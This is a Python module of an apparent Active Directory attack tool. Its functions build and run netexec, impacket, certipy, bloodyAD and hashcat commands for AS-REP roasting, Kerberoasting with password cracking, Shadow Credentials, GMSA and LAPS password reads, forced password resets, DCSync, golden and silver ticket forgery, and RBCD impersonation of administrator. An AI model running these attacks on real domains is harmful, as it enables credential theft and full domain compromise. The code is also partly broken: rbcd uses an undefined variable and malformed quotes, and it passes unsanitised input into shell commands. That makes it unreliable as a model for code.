import os 
import config, settings
import re
from mods import dacl

def asreproast(box, path):
    """
    list optional (Missing)
    """
    if config.HELP:    
        print("""
Action:\t[Attack] aroast
Tool:\tnetexec, hashcat
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-o, --outputfile (Optional)
Desc:\tPerforms AS-REP Roasting to extract crackable Kerberos AS-REP hashes from accounts without pre-authentication.
Info:\t/
        """)
        return 0
    os.chdir(path.ws_atk)
    print('\033[92m[*]\033[0m ASREProast')
    outputfile = "ASREProastables.txt"
    if config.OUTPUT_FILE:
        outputfile = config.OUTPUT_FILE
    if box.file:
        # kerberos -k ? 
        cmd1 = f"netexec ldap {box.fqdn} -u {box.file} -p '' --asreproast {outputfile}"
    elif isinstance(box.krb, str):
        cmd1 = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache --asreproast {outputfile}"
    elif box.krb:
        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k --asreproast {outputfile}"
    elif box.nt_hash:
        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --asreproast {outputfile}"
    else:
        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --asreproast {outputfile}"
    cmd2 = f'hashcat -m 18200 {outputfile} {settings.WORDLIST}'
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    if os.path.isfile(outputfile):
        print(f'\n\033[96m[$]\033[0m {cmd2}')
        os.system(cmd2)
    else:
        print(f"\033[93m[-]\033[0m Output file enum/{outputfile} is not there, skip cracking.")
    print('\033[38;5;28m[+]\033[0m ASREProast\n')

def krbroast(box, path):
    if config.HELP:    
        print("""
Action:\t[Attack] kroast
Tool:\t[netexec, impacket], hashcat
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target      (Optional)
\t-o, --outputfile  (Optional)
Desc:\tPerforms Kerberoasting to extract crackable Kerberos TGS hash from objects that have a SPN set.
Info:\t/
        """)
        return 0
    print('\033[92m[*]\033[0m Kerberoast')
    user_input = config.ask_for_action_choice("NXC,imp")
    outputfile = "kerberoastables.txt"
    if config.OUTPUT_FILE:
        outputfile = config.OUTPUT_FILE
    if user_input.lower() == "nxc":
        config.required_creds(box)
        os.chdir(path.ws_atk)
        if isinstance(box.krb, str):
            cmd1 = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache --kerberoasting {outputfile}"
        elif box.krb:
            cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k --kerberoasting {outputfile}"
        elif box.nt_hash:
            cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --kerberoasting {outputfile}"
        else:
            cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --kerberoasting {outputfile}"
        cmd2 = f'hashcat -m 13100 {outputfile} {settings.WORDLIST}'
        config.log_cmd([cmd1,cmd2])
        print(f'\033[96m[$]\033[0m {cmd1}')
        os.system(cmd1)
        print(f'\033[96m[$]\033[0m {cmd2}')
        os.system(cmd2)
    elif user_input.lower() == "imp":
        config.required_creds(box)
        os.chdir(path.ws_atk)
        opt = ""
        if box.target:
            opt = f"-request-user {box.target} "
            outputfile = f"{box.target}-hash.txt"
        if isinstance(box.krb, str):
            cmd1 = f"{box.krb_ccache} impacket-GetUserSPNs -k -dc-host {box.fqdn} {opt}-outputfile {outputfile} {box.domain}/"
        elif box.krb:
            cmd1 = f"impacket-GetUserSPNs -k -dc-host {box.fqdn} {box.domain}/{box.username}:{box.password} {opt}-outputfile {outputfile}"
        elif box.nt_hash:
            cmd1 = f"impacket-GetUserSPNs -dc-host {box.fqdn} {box.domain}/{box.username} -hashes :{box.nt_hash} {opt}-outputfile {outputfile}"
        else:
            cmd1 = f"impacket-GetUserSPNs -dc-host {box.fqdn} {box.domain}/{box.username}:{box.password} {opt}-outputfile {outputfile}"
        cmd2 = f'hashcat -m 13100 {outputfile} {settings.WORDLIST}'
        config.log_cmd([cmd1,cmd2])
        print(f'\033[96m[$]\033[0m {cmd1}')
        os.system(cmd1)
        print(f'[*] Outputfile: {outputfile}')
        os.system(f'cat {outputfile}')
        print(f'\033[96m[$]\033[0m {cmd2}')
        os.system(cmd2)
    else:
        print("\033[91m[!]\033[0m Incorrect input!")
        exit()
    print('\n\033[38;5;28m[+]\033[0m Kerberoast\n')

def target_krbroast(box, path):
    if config.HELP:    
        print("""
Action:\t[Attack] tkroast
Tool:\ttargetedKerberoast, hashcat
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target (Optional)
Desc:\tSet SPN to the target and performs Kerberoasting to extract crackable Kerberos TGS hash.
Info:\tNot sure if this works with kerberos login, but this works to -a wspn,kroast
        """)
        return 0  
    config.required_creds(box)
    opt = ''
    target = ''
    os.chdir(path.ws_atk)
    print('\033[92m[*]\033[0m Targeted Kerberoasting (time sync)')
    if box.target and box.target != box.username:
        opt = f' --request-user {box.target}'
        target = '-'+box.target
    if isinstance(box.krb, str):
        cmd1 = f"{box.krb_ccache} targetedKerberoast.py -d {box.domain} -k --no-pass -o targeted_kerberoasting{target}.txt"+opt
    elif box.krb:
        cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -p {box.password} -k -o targeted_kerberoasting{target}.txt"+opt
    elif box.nt_hash:
        cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -H {box.nt_hash} -o targeted_kerberoasting{target}.txt"+opt
    else:
        cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -p {box.password} -o targeted_kerberoasting{target}.txt"+opt
    cmd2 = f'hashcat -m 13100 targeted_kerberoasting{target}.txt /usr/share/WORDLISTs/rockyou.txt'
    config.log_cmd([cmd1,cmd2])
    config.time_sync(box.fqdn)
    if os.path.exists(f'{path.ws_atk}/targeted_kerberoasting{target}.txt'):
        os.remove(f'{path.ws_atk}/targeted_kerberoasting{target}.txt')
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[38;5;28m[+]\033[0m Targeted Kerberoasting\n')

def shadow_creds(box, path):
    if config.HELP:    
        print("""
Action:\t[Attack] sc
Tool:\tcertipy-ad
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tAbuses Shadow Credentials to add alternate authentication keys to get TGT and NT hash from target.
Info:\tIt use the auto option.
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    os.chdir(path.ws_atk)
    print('\033[92m[*]\033[0m Shadow Credentials (time sync)')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} certipy-ad shadow -target {box.fqdn} -dc-host {box.fqdn} -k -no-pass -account {box.target} auto"
    elif box.krb:
        cmd = f"certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -p {box.password} -k -account {box.target} auto"
    elif box.nt_hash:
        cmd = f"certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -hashes {box.nt_hash} -account {box.target} auto"
    else:
        cmd = f"certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -p {box.password} -account {box.target} auto"
    config.log_cmd(cmd)
    config.time_sync(box.fqdn)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd+f' 2>&1 | tee {box.target}-shadow_creds.out')
    print('\033[38;5;28m[+]\033[0m Shadow Credentials\n')

def ReadGMSAPassword(box, path):
    if config.HELP:    
        print("""
Action:\t[Attack] gmsa
Tool:\tnetexec
Option:\t-u, --username
\t-p --password; -H, --hash; -k
Desc:\tRead the ReadGMSAPassword from the attribute msDS-ManagedPassword.
Info:\t/
        """)
        return 0
    config.required_creds(box)
    print('\033[92m[*]\033[0m ReadGMSAPassword')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache --gmsa"
    elif box.krb:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k --gmsa"
    elif box.nt_hash:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --gmsa"
    else:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --gmsa"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    cmd_out = os.popen(cmd).read()
    print(cmd_out)
    match = re.search(r'Account:\s+(\S+)', cmd_out)
    if match:
        gmsa_name = match.group(1)
        with open(f'{path.ws_atk}/gmsa-{gmsa_name}.out', "w", encoding="utf-8") as f:
            f.write(cmd_out)
    print('\033[38;5;28m[+]\033[0m Read GMSA password\n')

def ReadLAPSPassword(box, path):
    if config.HELP:    
        print("""
Action:\t[Attack] laps
Tool:\timpacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target (Optional)
Desc:\tReads the local administrator password of a computer from the ms-Mcs-AdmPwd attribute.
Info:\t/
        """)
        return 0
    config.required_creds(box)
    os.chdir(path.ws_atk)
    target = ''
    opt = ''
    print('\033[92m[*]\033[0m Read LAPS password')
    if box.target:
        opt = f" -computer {box.target}"
        target = box.target+'-'
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} impacket-GetLAPSPassword {box.domain}/ -k -no-pass"+opt
    elif box.krb:
        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username} {box.domain}/{box.username}:{box.password} -k "+opt
    elif box.nt_hash:
        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:{box.password}"+opt
    else:
        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:{box.password}"+opt
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd+f' 2>&1 | tee {target}laps_password.out')
    print('\033[38;5;28m[+]\033[0m Read LAPS password\n')

def ForceChangePassword(box):
    if config.HELP:    
        print("""
Action:\t[Attack] chpw
Tool:\tbloodyAD
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tChange the password from a target.
Info:\tDefault password: newPassword1!
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    new_password = 'newPassword1!'
    print('\033[92m[*]\033[0m ForceChangePassword')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} bloodyAD --host {box.fqdn} -d {box.domain} -k set password {box.target} {new_password}"
    elif box.krb:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} -k set password {box.target} {new_password}"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} set password {box.target} {new_password}"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} set password {box.target} {new_password}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print(f"\033[95m[#]\033[0m Target Creds: {box.target} : {new_password}\t-u {box.target} -p '{new_password}'")
    print('\033[38;5;28m[+]\033[0m ForceChangePassword\n')

def dcsync(box, path):
    if config.HELP:    
        print("""
Action:\t[Attack] dcsync
Tool:\timpacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target (Optional)
Desc:\tDumps secrets like SAM, LSA, and NTDS.dit from a domain. 
\tSave output to a file, default: secretsdump.out
Info:\t/
        """)
        return 0
    config.required_creds(box)
    opt = ''
    outfile = 'secretsdump.out'
    os.makedirs(path.ws_atk+'secretsdump', exist_ok=True)
    os.chdir(path.ws_atk+'secretsdump')
    print('\033[92m[*]\033[0m DCSync')
    if box.target:
        opt = f' -just-dc-user {box.target}'
        outfile = f'{box.target}-secretsdump.out'
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} impacket-secretsdump {box.fqdn} -k -no-pass -outputfile {outfile}"+opt
    elif box.krb:
        cmd = f"impacket-secretsdump {box.domain}/{box.username}:{box.password}@{box.fqdn} -k -no-pass -outputfile {outfile}"+opt
    elif box.nt_hash:
        cmd = f"impacket-secretsdump {box.domain}/{box.username}@{box.fqdn} -hashes :{box.nt_hash} -outputfile {outfile}"+opt
    else:
        cmd = f"impacket-secretsdump {box.domain}/{box.username}:{box.password}@{box.fqdn} -outputfile {outfile}"+opt
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m DCSync\n')

def golden_ticket(box, path):
    if config.HELP:    
        print("""
Action:\t[Attack] gold
Tool:\timpacket
Option:\t-H, --hash (KRBTGT: nthash or aesKey)
Desc:\tGenerates and forges Kerberos Golden Tickets (TGT) by abusing the KRBTGT account nthash or aesKey.
Info:\tNeeds domain-sids.out file for the domain SID (-a sid).
\t Always created a TGT for administrator RID: 500.
        """)
        return 0
    config.required_creds(box)
    os.chdir(path.ws_ccache)
    if not os.path.exists(f'{path.ws_enum}domain-sids.out'):
        print(f'\033[91m[!]\033[0m Needs the domain SID, run first:\n\t-a sid')
        exit()
    else:
        sid = os.popen(f"""cat {path.ws_enum}domain-sids.out | grep "Domain SID is:" | cut -d':' -f2 | xargs""").read().strip()
    print('\033[92m[*]\033[0m Golden ticket')
    if box.nt_hash:
        if len(box.nt_hash) == 32:
            cmd = f"impacket-ticketer -nthash {box.nt_hash} -domain-sid {sid} -domain {box.domain} -user-id 500 administrator"
        else:
            cmd = f"impacket-ticketer -aesKey {box.nt_hash} -domain-sid {sid} -domain {box.domain} -user-id 500 administrator"
    else:
        print(f'\033[91m[!]\033[0m Need NT hash or AES key for golden ticket!')
        exit()
    print(f'\033[96m[$]\033[0m {cmd}')
    config.log_cmd(cmd)
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m Golden ticket\n')

def silver_ticket(box, path):
    if config.HELP:    
        print("""
Action:\t[Attack] silver
Tool:\timpacket
Option:\t-u, --username
\t-H, --hash (svc: nthash or aesKey)
Desc:\tGenerates and forges Kerberos Silver Tickets (TGS) by abusing the service account nthash or aesKey.
Info:\tNeeds domain-sids.out file for the domain SID (-a sid).
\tAlways created a TGS for administrator RID: 500.
\tFix SPN host/<username>.<domain>
        """)
        return 0
    config.required_creds(box)
    os.chdir(path.ws_ccache)
    if not os.path.exists(f'{path.ws_enum}domain-sids.out'):
        print(f'\033[91m[!]\033[0m Needs the domain SID, run first:\n\t-a, --action sid')
        exit()
    else:
        sid = os.popen(f"""cat {path.ws_enum}domain-sids.out | grep "Domain SID is:" | cut -d':' -f2 | xargs""").read().strip()
    print('\033[92m[*]\033[0m Golden ticket')
    if box.nt_hash:
        if len(box.nt_hash) == 32:
            cmd = f"impacket-ticketer -nthash {box.nt_hash} -domain-sid {sid} -domain {box.domain} -dc-ip {box.ip} -spn host/{box.username}.{box.domain} administrator"
        else:
            cmd = f"impacket-ticketer -aesKey {box.nt_hash} -domain-sid {sid} -domain {box.domain} -dc-ip {box.ip} -spn host/{box.username}.{box.domain} administrator"
    else:
        print(f'\033[91m[!]\033[0m Need NT hash or AES key for silver ticket!')
        exit()
    print(f'\033[96m[$]\033[0m {cmd}')
    config.log_cmd(cmd)
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m Silver ticket\n')

def rbcd(box,path):
    if config.HELP:    
        print("""
Action:\t[Attack] rbcd
Tool:\timpacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tAbuses Resource-Based Constrained Delegation to let a new computer account impersonate a target user to a service.
Info:\tDefault creds: RBCDPC:RBCDPC123!
\tAlways impersonate administrator.
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    os.chdir(path.ws_ccache)
    computer_name = 'RBCDPC'
    computer_password = dacl.addcomputer(box,computer_name)
    box.target = box.target.replace("$","")
    print('\033[92m[*]\033[0m Resource Based Constrained Delegation')
    if isinstance(box.krb, str):
        cmd1 = f"{box.krb_ccache} impacket-rbcd {box.domain}/ -k --no-pass -dc-host {box.fqdn} -delegate-from {computer_name} -delegate-to {box.target} -action write"
        cmd2 = f"KRB5CCNAME='{config.kerberos_auth(box, path, computer_name,computer_password)}' impacket-getST {box.domain}/ -k --no-pass -spn host/{target.lower()}.{box.domain} -impersonate administrator"
    elif box.krb:
        cmd1 = f"impacket-rbcd {box.domain}/{box.username}:{box.password} -k -dc-host {box.fqdn} -delegate-from {computer_name} -delegate-to {box.target} -action write"
        cmd2 = f"impacket-getST {box.domain}/{computer_name}:{computer_password}' -k -spn host/{target.lower()}.{box.domain} -impersonate administrator"
    elif box.nt_hash:
        cmd1 = f"impacket-rbcd {box.domain}/{box.username} -hashes :{box.nt_hash} -delegate-from {computer_name} -delegate-to {box.target} -action write"
        cmd2 = f"impacket-getST {box.domain}/{computer_name} -hashes :{config.nt_hashing(computer_password)}' -spn host/{target.lower()}.{box.domain} -impersonate administrator"
    else:
        cmd1 = f"impacket-rbcd {box.domain}/{box.username}:{box.password} -delegate-from {computer_name} -delegate-to {box.target} -action write"
        cmd2 = f"impacket-getST {box.domain}/{computer_name}:{computer_password}' -spn host/{target.lower()}.{box.domain} -impersonate administrator"
    config.time_sync(box.fqdn)
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[38;5;28m[+]\033[0m Resource Based Constrained Delegation\n')
